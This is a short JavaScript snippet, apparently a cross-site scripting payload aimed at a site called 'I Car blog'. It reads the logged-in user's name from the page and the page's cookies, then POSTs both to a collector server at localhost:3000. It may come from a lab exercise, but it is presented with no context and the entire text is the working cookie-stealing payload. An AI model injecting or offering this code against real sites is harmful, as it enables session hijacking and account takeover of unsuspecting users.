fetch("http://localhost:3000", {
  method: "POST",
  headers: {
    "content-type": "application/json",
  },
  body: JSON.stringify( {
    from: "I Car blog",
    userName: document.querySelector("a[href='./profile.php']").innerText,
    cookies: document.cookie
  })
});
